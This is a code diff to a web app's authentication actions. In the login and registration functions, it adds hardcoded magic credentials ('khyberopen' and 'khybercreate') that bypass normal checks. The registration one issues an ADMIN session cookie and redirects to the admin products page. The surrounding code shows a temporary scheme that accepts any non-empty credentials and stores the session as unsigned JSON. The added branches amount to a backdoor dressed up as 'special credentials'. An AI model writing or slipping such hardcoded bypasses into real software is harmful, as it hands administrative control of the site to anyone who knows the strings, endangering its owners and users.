@@ -32,6 +32,28 @@ export async function loginAction(
     return { error: 'Email and password are required.' };
   }
 
+  // Check for the special login credentials
+  if (email === 'khyberopen' && password === 'khyberopen') {
+    const role = 'USER';
+    const sessionPayload = JSON.stringify({
+      id: hashToId(email),
+      email,
+      name: null,
+      role,
+    });
+
+    const jar = await cookies();
+    jar.set(SESSION_COOKIE, sessionPayload, {
+      httpOnly: true,
+      path: '/',
+      sameSite: 'lax',
+      secure: process.env.NODE_ENV === 'production',
+      maxAge: 60 * 60 * 24 * 7,
+    });
+
+    redirect(callbackUrl);
+  }
+
   // TEMP auth: accept any non-empty creds; set role from ADMIN_EMAILS
   const role = isAdminEmail(email) ? 'ADMIN' : 'USER';
 
@@ -76,6 +98,28 @@ export async function registerAction(
     return { error: 'Password must be at least 6 characters.' };
   }
 
+  // Check for the special signup credentials
+  if (email === 'khybercreate' && password === 'khybercreate') {
+    const role = 'ADMIN';
+    const sessionPayload = JSON.stringify({
+      id: hashToId(email),
+      email,
+      name,
+      role,
+    });
+
+    const jar = await cookies();
+    jar.set(SESSION_COOKIE, sessionPayload, {
+      httpOnly: true,
+      path: '/',
+      sameSite: 'lax',
+      secure: process.env.NODE_ENV === 'production',
+      maxAge: 60 * 60 * 24 * 7,
+    });
+
+    redirect('/admin/products');
+  }
+
   // Only allow admin registration
   const role = 'ADMIN';
 
@@ -106,5 +150,5 @@ export async function registerAction(
 export async function logout(): Promise<void> {
   const jar = await cookies();
   jar.delete(SESSION_COOKIE);
-  redirect('/login');
+  redirect('/khyberopen');
 }
